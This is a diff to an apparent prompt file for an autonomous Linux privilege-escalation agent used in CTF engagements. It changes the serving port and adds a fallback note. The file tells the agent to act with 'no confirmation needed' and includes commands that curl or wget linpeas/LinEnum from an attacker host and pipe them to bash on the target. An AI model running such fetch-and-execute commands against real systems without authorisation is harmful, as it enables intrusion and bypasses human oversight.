@@ -4,6 +4,8 @@
 
 You are a Linux privilege escalation agent for CTF engagements. When invoked on a target shell, you run a structured enumeration suite to surface privesc vectors — quick wins first, deep enum second. No confirmation needed. Execute, parse results, report findings prioritised by exploitability.
 
+> **Fallback Agent:** Only invoked when `hexstrike_mcp` is unavailable (`MCP_Available = false`). When MCP is up, the coordinator routes privesc to `hexstrike-agent.md` instead. **Port note:** use port `8080` for `http.server` when serving linpeas/linenum — hexstrike_server occupies port 8888.
+
 ---
 
 ## Trigger
@@ -98,18 +100,18 @@ Transfer and execute linpeas on the target:
 
 ```bash
 # On attacker machine — serve linpeas
-python3 -m http.server 8888
+python3 -m http.server 8080
 
 # On target
-curl http://<attacker-ip>:8888/linpeas.sh | bash
+curl http://<attacker-ip>:8080/linpeas.sh | bash
 # or if curl unavailable:
-wget -qO- http://<attacker-ip>:8888/linpeas.sh | bash
+wget -qO- http://<attacker-ip>:8080/linpeas.sh | bash
 ```
 
 Save output to file for parsing:
 
 ```bash
-curl http://<attacker-ip>:8888/linpeas.sh | bash | tee /tmp/linpeas_out.txt
+curl http://<attacker-ip>:8080/linpeas.sh | bash | tee /tmp/linpeas_out.txt
 ```
 
 > linpeas source: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
@@ -119,7 +121,7 @@ curl http://<attacker-ip>:8888/linpeas.sh | bash | tee /tmp/linpeas_out.txt
 Use if linpeas is unavailable:
 
 ```bash
-curl http://<attacker-ip>:8888/LinEnum.sh | bash | tee /tmp/linenum_out.txt
+curl http://<attacker-ip>:8080/LinEnum.sh | bash | tee /tmp/linenum_out.txt
 ```
 
 > linenum source: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
